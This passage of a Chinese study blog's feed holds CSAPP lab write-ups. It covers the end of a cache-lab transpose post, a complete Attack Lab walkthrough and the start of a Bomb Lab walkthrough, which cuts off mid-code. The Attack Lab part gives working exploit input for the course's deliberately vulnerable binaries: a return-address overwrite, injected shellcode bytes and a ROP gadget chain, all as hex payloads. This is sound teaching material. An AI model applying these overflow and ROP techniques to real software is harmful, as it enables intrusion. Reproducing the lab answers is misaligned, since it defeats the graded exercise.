B[j + <span class="hljs-number">7</span>][i + cnti] = temp4;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="61×67"><a href="#61×67" class="headerlink" title="61×67"></a>61×67</h2><p>这玩意就很不规则了，之前之所以又是循环展开的，又是小心翼翼控制矩阵大小的，无非是因为</p><ol><li>循环展开：避免A和B之间碰撞。因为A和B的地址间距刚好是cache大小的倍数。</li><li>矩阵大小：避免A或者B内部不断碰撞。行操作的那一个没事，但是列操作的那一个就遭殃了。</li></ol><p>而这一切在61×64的矩阵下都不是问题，因为A或者B内部基本不会碰撞，那矩阵的大小就无所谓了，选一个最小的就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> edge 17</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">deal_61_67</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span> &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i += edge) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j += edge) &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x = i; x &lt; i + edge &amp;&amp; x &lt; N; x++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y = j; y &lt; j + edge &amp;&amp; y &lt; M; y++) &#123;<br>          B[y][x] = A[x][y];<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>感谢<a href="https://zhuanlan.zhihu.com/p/456858668#">这位大佬</a>的博客提供的帮助</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab3</title>
    <link href="/2023/07/30/csapp-lab3/"/>
    <url>/2023/07/30/csapp-lab3/</url>
    
    <content type="html"><![CDATA[<h1 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h1><p>首先，通过这个指令生成前三个阶段要用到的ctarget的反汇编代码<code>objdump -d ./ctarget &gt;&gt; target.s</code><br>其次，假设我们的输入文件是touch1.txt，那么运行这个指令就可以去验证是否是正确的<code>./hex2raw &lt;touch1.txt | ./ctarget -q</code><br>整理一下phase1个意思</p><ol><li>它想要我们通过输入使栈溢出，并且覆盖这个函数的返回地址，使这个地址指向我们想要的函数</li><li>因此，我们需要从十六进制的角度构造我们的输入</li><li>但是题目使用的是getbuf这个函数从标准输入区读取输入，因此它是以字符串的形式来读取。</li><li>我们需要把我们构造出来的十六进制数据转成对应的字符串。而这个工作cmu已经帮我们做好了，就是这个程序<code>hex2raw</code>。</li><li>所以我们可以现在一个txt文件中写好我们的输入，然后通过上述程序将这个文件中的十六进制数据转为字符串，最后使用这个字符串作为ctarget的输入。<br>接下来可以正式进入解题了<br>整体的流程是，test函数会调用getbuf，我们需要在getbuf的函数中操作，使得getbuf不会正常返回，而是返回到touch1函数<br>可以发现，getbuf这个函数给自己开辟了40个字节的栈空间，因此它的返回地址其实是在第41-48个字节<br>因此，我们的注入应该包含48个字节<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++">(gdb) disas getbuf<br>Dump of assembler code <span class="hljs-keyword">for</span> function getbuf:<br>   <span class="hljs-number">0x00000000004017a8</span> &lt;+<span class="hljs-number">0</span>&gt;:     sub    $<span class="hljs-number">0x28</span>,%rsp<br>   <span class="hljs-number">0x00000000004017ac</span> &lt;+<span class="hljs-number">4</span>&gt;:     mov    %rsp,%rdi<br>   <span class="hljs-number">0x00000000004017af</span> &lt;+<span class="hljs-number">7</span>&gt;:     callq  <span class="hljs-number">0x401a40</span> &lt;Gets&gt;<br>   <span class="hljs-number">0x00000000004017b4</span> &lt;+<span class="hljs-number">12</span>&gt;:    mov    $<span class="hljs-number">0x1</span>,%eax<br>   <span class="hljs-number">0x00000000004017b9</span> &lt;+<span class="hljs-number">17</span>&gt;:    add    $<span class="hljs-number">0x28</span>,%rsp<br>   <span class="hljs-number">0x00000000004017bd</span> &lt;+<span class="hljs-number">21</span>&gt;:    retq<br>End of assembler dump.<br></code></pre></td></tr></table></figure>接下来，需要找到touch1的地址，在我的这个文件里，touch1函数的起始地址是0x4017c0<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++">(gdb) disas touch1<br>Dump of assembler code <span class="hljs-keyword">for</span> function touch1:<br>   <span class="hljs-number">0x00000000004017c0</span> &lt;+<span class="hljs-number">0</span>&gt;:     sub    $<span class="hljs-number">0x8</span>,%rsp<br>   <span class="hljs-number">0x00000000004017c4</span> &lt;+<span class="hljs-number">4</span>&gt;:     movl   $<span class="hljs-number">0x1</span>,<span class="hljs-number">0x202d0e</span>(%rip)        # <span class="hljs-number">0x6044dc</span> &lt;vlevel&gt;<br>   <span class="hljs-number">0x00000000004017ce</span> &lt;+<span class="hljs-number">14</span>&gt;:    mov    $<span class="hljs-number">0x4030c5</span>,%edi<br>   <span class="hljs-number">0x00000000004017d3</span> &lt;+<span class="hljs-number">19</span>&gt;:    callq  <span class="hljs-number">0x400cc0</span> &lt;puts@plt&gt;<br>   <span class="hljs-number">0x00000000004017d8</span> &lt;+<span class="hljs-number">24</span>&gt;:    mov    $<span class="hljs-number">0x1</span>,%edi<br>   <span class="hljs-number">0x00000000004017dd</span> &lt;+<span class="hljs-number">29</span>&gt;:    callq  <span class="hljs-number">0x401c8d</span> &lt;validate&gt;<br>   <span class="hljs-number">0x00000000004017e2</span> &lt;+<span class="hljs-number">34</span>&gt;:    mov    $<span class="hljs-number">0x0</span>,%edi<br>   <span class="hljs-number">0x00000000004017e7</span> &lt;+<span class="hljs-number">39</span>&gt;:    callq  <span class="hljs-number">0x400e40</span> &lt;exit@plt&gt;<br>End of assembler dump.<br></code></pre></td></tr></table></figure>因此构造的输入应该是下面这样，前40个字节随便填，后面八个字节需要是地址，整体应该和下面一样。<br>其实最后八个字节到底按什么顺序写还是挺有讲究的。<br>首先，我们读入的内容是从栈顶到栈底一次写入，想一下内存中的栈的那个图，也就是说我们写入的东西其实从从下往上从右往左一个一个填入栈中的，因此按下面这个方式输入的话，在栈的某一层，存的应该是00 00 00 00 00 40 17 c0，乍一看这不就是我们的地址吗？说好的小端法呢？<br>先回忆一下小端法的定义，小端法指的是低位放在低地址处，我们这c0是低位，它放的是地址的低处吗？当然是，因为栈是从上往下递减的，虽然看着c0是放在最后面，但是其实它是低地址处。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>c0 <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>通过<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++">woaixiaoxiao@LAPTOP-URFTCS5A:~/CSAPP/<span class="hljs-number">3</span>_attacklab$ ./hex2raw &lt;touch1.txt | ./ctarget -q<br>Cookie: <span class="hljs-number">0x59b997fa</span><br>Type string:Touch1!: <span class="hljs-function">You called <span class="hljs-title">touch1</span><span class="hljs-params">()</span></span><br><span class="hljs-function">Valid solution <span class="hljs-keyword">for</span> level 1 with target ctarget</span><br><span class="hljs-function">PASS: Would have posted the following:</span><br><span class="hljs-function">        user id bovik</span><br><span class="hljs-function">        course  <span class="hljs-number">15213</span>-f15</span><br><span class="hljs-function">        lab     attacklab</span><br><span class="hljs-function">        result  <span class="hljs-number">1</span>:PASS:<span class="hljs-number">0xffffffff</span>:ctarget:<span class="hljs-number">1</span>:<span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> C0 <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span></span><br></code></pre></td></tr></table></figure></li></ol><h1 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h1><p>这一次就更大胆了，上次只是修改一下返回地址，使得程序转去执行已有的代码<br>这一次要做的事情是自己先写一段代码，然后重定向到自己写的代码中。<br>而自己写的汇编代码就是要调用<code>void touch2(unsigned val)</code>函数，并且还得穿个参数</p><ol><li>传参数就是传自己的cookie：0x59b997fa到rdi寄存器，即函数的第一个参数所在的寄存器</li><li>然后就是转移到touch2，这里推荐的转移方法是通过ret指令，而ret指令是从栈中弹出一个地址，所以还需要先把要去的地址压栈<br>首先，找到touch2的起始地址：0x00000000004017ec<br>然后编写汇编文件<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">mov $<span class="hljs-number">0x59b997fa</span>,%rdi<br>pushq $<span class="hljs-number">0x00000000004017ec</span><br>retq<br></code></pre></td></tr></table></figure>然后将这个汇编文件转为二进制形式：因为我们需要二进制形式。</li><li>将这个汇编文件变成可执行文件<code>gcc -c touch2.s</code></li><li>然后使用<code>objdump -d touch2.o</code>就可以获得有二进制的文件了<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000000000</span> &lt;.text&gt;:<br>   <span class="hljs-number">0</span>:   <span class="hljs-number">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span>    mov    $<span class="hljs-number">0x59b997fa</span>,%rdi<br>   <span class="hljs-number">7</span>:   <span class="hljs-number">68</span> ec <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>          pushq  $<span class="hljs-number">0x4017ec</span><br>   c:   c3                      retq   <br></code></pre></td></tr></table></figure>因此，我们要输入13个字节，依次是48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3<br>如果我们直接把这个作为输入，那么我们的程序就已经在内存中了，但是怎么去执行呢？那就要使用phase1中的重定向功能了<br>如果将13个字节中的48作为输入数据的开头，那么我们的程序的起始地址就是getbuf函数的栈顶，通过打断点然后查看rsp的值，发现rsp的值为<code>0x5561dc78</code><br>至此，所有原材料都ok了，现在就是拼接成我们的输入</li><li>首先，重定向地址和phase1一样的输入方式</li><li>其次，我们写的代码，也就是48开头的那一拨，这些属于指令，指令就是从低地址开始取的，不需要考虑小端法。小端法只对数据有作用！</li><li>注意我们写的代码加上补充的0需要够40个字节。问就是我第一次少输入了八个字节的0<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">68</span><br>ec <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="phase3"><a href="#phase3" class="headerlink" title="phase3"></a>phase3</h1><p>这一个阶段的意思是</p><ol><li>首先我们依然要重定向到一个函数，这里是touch3，并且我们需要传入一个参数。这就是phase2的任务了</li><li>关键在于我们通过getbuf-&gt;touch3，在getbuf执行完之后，我们去执行touch3。在执行touch3的时候，getbuf函数的栈其实已经被收回了，而且在touch3中又调用了函数，所以原来getbuf的栈里的东西都不能用了。</li><li>而题目要求我们先把我们的字符串放到内存的某个位置，然后把这个字符串的地址作为参数传给touch3。传地址给touch3倒没啥问题，关键在于我们的字符串就不能放在getbuf的栈中了。哪里安全呢？这就是这个阶段的关键，我们要把字符串存到一个安全的内存去。<br>哪里的内存是安全的呢？下面是函数的调用顺序，其中getbuf函数执行之后就把空间还回去了。最安全的地方当然还是往getbuf栈帧空间的上面去。也就是test的栈帧空间</li><li>test</li><li>getbuf</li><li>touch3</li><li>hexmatch</li><li>strncmp<br>首先，我的cookie是0x59b997fa，翻译为ascii码如下所示。注意:需要转为十六进制的表示。因此我这个字符串就应该是35 39 62 39 39 37 66 61 00。并且字符串也是没有字节序的概念的<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">字符:        <span class="hljs-string">&#x27;5&#x27;</span>    <span class="hljs-string">&#x27;9&#x27;</span>    <span class="hljs-string">&#x27;b&#x27;</span>    <span class="hljs-string">&#x27;9&#x27;</span>    <span class="hljs-string">&#x27;9&#x27;</span>    <span class="hljs-string">&#x27;7&#x27;</span>    <span class="hljs-string">&#x27;f&#x27;</span>    <span class="hljs-string">&#x27;a&#x27;</span>    <span class="hljs-string">&#x27;\0&#x27;</span><br>ASCII值:    <span class="hljs-number">53</span>     <span class="hljs-number">57</span>     <span class="hljs-number">98</span>     <span class="hljs-number">57</span>     <span class="hljs-number">57</span>     <span class="hljs-number">55</span>     <span class="hljs-number">102</span>    <span class="hljs-number">97</span>     <span class="hljs-number">0</span><br>十六进制:   <span class="hljs-number">35</span>     <span class="hljs-number">39</span>     <span class="hljs-number">62</span>     <span class="hljs-number">39</span>     <span class="hljs-number">39</span>     <span class="hljs-number">37</span>     <span class="hljs-number">66</span>     <span class="hljs-number">61</span>     <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>通过gdb调试可以发现，test函数的栈帧从5561dca8开始，在调用getbuf之前，又向下扩展了8个字节，变成了5561dca0，而这个位置其实也就是我们之前一直偷偷放重定向函数的位置。<br>因此，我们的字符串应该放在5561dca8这里，其实也就是贴着重定向的地址放即可。<br>最终的答案如下，相比于第二阶段</li><li>只需要修改我们自己写的汇编代码的参数为字符串的地址</li><li>然后将汇编代码中touch2的地址改为touch3的地址</li><li>在最后面加上我们的字符串即可<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">48</span> c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span><br>fa <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-comment">// 以上为getbuf的栈帧</span><br><span class="hljs-number">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-comment">// 这里的地址是5561dca0，存储的是重定向的地址</span><br><span class="hljs-number">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span> <span class="hljs-comment">// 这里的地址是5561dca8，存储的是字符串</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h1><p>这个阶段要完成的任务和phase2是一样的，即</p><ol><li>将我们的cookie传入rdi</li><li>将控制权移到touch2中<br>但是这里的比较难，因为栈中的代码不可执行<br>所以我们只能去已有的代码库中拼凑出我们需要的指令，一种思路是这样</li><li>将我们的cookie通过一个pop函数弹出到某个寄存器，因为pop函数不需要我们去指定地址，是自动从栈里弹出一个数字出来</li><li>然后将rdi设置为这个寄存器的值，找到一个对应的mov指令</li><li>上面那个指令应该以ret结尾，我们提前将touch2的地址放在栈中，这一ret，正好就跳到ret去执行了<br>注意点</li><li>这个时候栈的地址是随机的，但是我们的输入塞到栈的缓冲区之后，逻辑上依然是和之前栈地址连续一样的，只不过显示出来的值是随机的<br>首先，通过<code>objdump -d rtarget &gt; rtarget.txt</code>将rtarget反汇编<br>然后去start_farm到end_farm中去凑我们需要的指令，pop有以下这么多种，我们除了pop，还应该衔接一个ret，它的编码是0xc3，另外，我们出现0x90也是合法的，应该这玩意就是nop指令，摸鱼用的。<blockquote><p>popq R 58 59 5a 5b 5c 5d 5e 5f</p></blockquote></li></ol><p>经过查找，发现了一个合适的，从4019ab开始，是58 90 c3分别代表了pop rax，nop，ret。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00000000004019</span>a7 &lt;addval_219&gt;:<br>  <span class="hljs-number">4019</span>a7:<span class="hljs-number">8</span>d <span class="hljs-number">87</span> <span class="hljs-number">51</span> <span class="hljs-number">73</span> <span class="hljs-number">58</span> <span class="hljs-number">90</span>    lea    <span class="hljs-number">-0x6fa78caf</span>(%rdi),%eax<br>  <span class="hljs-number">4019</span>ad:c3                   retq   <br></code></pre></td></tr></table></figure><p>如果栈中的结构如下所示，那么getbuf结束之后就会去执行4019ab处的代码，这个代码会将cookie放到rax中</p><ol><li>cookie</li><li>4019ab</li><li>getbuf的缓冲区<br>那么现在就应该在cookie上面再放一个地址，这个地址可以把rax的值挪到rdi中。查表之后发现，这个操作对应的机器码是48 89 c7。经过查找，下面这个片段可以利用，将地址放在4019a2，就正好执行了mov操作时候，ret掉<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00000000004019</span>a0 &lt;addval_273&gt;:<br>  <span class="hljs-number">4019</span>a0:<span class="hljs-number">8</span>d <span class="hljs-number">87</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 c3    lea    <span class="hljs-number">-0x3c3876b8</span>(%rdi),%eax<br>  <span class="hljs-number">4019</span>a6:c3                   retq  <br></code></pre></td></tr></table></figure>那么ret应该ret到哪呢？当然是touch2的地址，去gdb中查询之后发现，touch2的地址是0x4017ec<br>由此，我们的原材料已经准备好了。这时候的栈从上到下应该是</li><li>0x4017ec</li><li>0x4019a2</li><li>cookie(0x59b997fa)</li><li>0x4019ab</li><li>getbuf的缓冲区<br>因此，我们的输入应该是<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>ab <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>a2 <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>ec <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>运行测试程序<code>./hex2raw &lt;touch4.txt | ./rtarget -q</code>，发现成功<br>有个注意点，那就是我们放在栈里面的基本都是地址，虽然写起来只写了几个字节，但是完整的地址应该是八个字节的，因此构造输入的时候是需要补0的。</li></ol><h1 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h1><p>第五个需要的原理和第四个差不多，要完成的效果和第三个phase差不多。<br>关键在于栈的地址不可控，因此需要在程序中去取rsp的值，然后把字符串存在一个距离rsp固定的地方<br><a href="https://www.zhihu.com/column/c_1458204480777273344">大佬链接</a>这位大佬写的挺好的<br>注意了，ret指令，是从栈中弹出一个地址，然后去执行这个地址！</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab2</title>
    <link href="/2023/07/29/csapp-lab2/"/>
    <url>/2023/07/29/csapp-lab2/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224202009.png" alt="20231224202009"></p><h1 id="寄存器相关的知识"><a href="#寄存器相关的知识" class="headerlink" title="寄存器相关的知识"></a>寄存器相关的知识</h1><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224202024.png" alt="20231224202024"></p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224202037.png" alt="20231224202037"></p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224202045.png" alt="20231224202045"></p><h1 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 对bomb可执行文件进行调试</span><br>gdb bomb<br><span class="hljs-comment">// 通过disas指令可以通过反汇编操作查看phase_1这个函数的汇编代码</span><br>disas phase_1<br><span class="hljs-comment">// 或者可以直接通过这个指令生成整个反汇编文件</span><br>objdump -d bomb &gt; bomb.s<br></code></pre></td></tr></table></figure><ol><li>通过下面这个文件可以发现，read_line函数的结果rax放入了rdi寄存器，也就是作为phase_1函数的第一个参数，然后调用了phase_1函数<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">400e32</span>:e8 <span class="hljs-number">67</span> <span class="hljs-number">06</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40149</span>e &lt;read_line&gt;<br><span class="hljs-number">400e37</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> c7             mov    %rax,%rdi<br><span class="hljs-number">400e3</span>a:e8 a1 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">400</span>ee0 &lt;phase_1&gt;<br></code></pre></td></tr></table></figure></li><li>在phase_1函数中，又将0x402400放入esi寄存器，调用了strings_not_equal函数。</li><li>此时rdi寄存器存的是readline函数的结果，esi寄存器存的是一个地址，分别作为strings_not_equal函数第一个和第二个参数。</li><li>因此可以猜测，我们需要输入的就是0x402400这个地方存的字符串。通过<code>x/s 0x402400</code>即可获得这个字符串<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++">Dump of assembler code <span class="hljs-keyword">for</span> function phase_1:<br>   <span class="hljs-comment">// 